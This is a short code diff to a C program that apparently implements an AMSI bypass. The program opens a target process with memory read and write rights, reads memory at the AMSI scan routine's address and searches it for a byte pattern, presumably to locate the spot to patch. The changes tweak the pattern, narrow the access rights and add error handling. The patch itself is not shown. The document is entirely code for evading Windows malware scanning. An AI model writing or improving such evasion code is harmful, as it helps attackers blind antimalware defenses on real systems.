@@ -70,7 +70,7 @@ searchPattern(
 int
 wmain() {
 
-	BYTE pattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74,'?' ,0x48,'?' ,'?' ,'?' ,'?',0x74,0x33 };
+	BYTE pattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74 };
 
 	DWORD patternSize = sizeof(pattern);
 
@@ -79,7 +79,7 @@ wmain() {
 	if (!tpid)
 		return (-1);
 
-	HANDLE ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, tpid);
+	HANDLE ProcessHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, 0, tpid);
 
 	if (!ProcessHandle)
 		return (-1);
@@ -97,7 +97,8 @@ wmain() {
 
 	unsigned char buff[1024];
 
-	ReadProcessMemory(ProcessHandle, AmsiAddr, &buff, 1024, (SIZE_T*)NULL);
+	if (!ReadProcessMemory(ProcessHandle, AmsiAddr, &buff, 1024, (SIZE_T*)NULL))
+		return (-1);
 
 	int matchAddress = searchPattern(buff, sizeof(buff), pattern, patternSize);
 
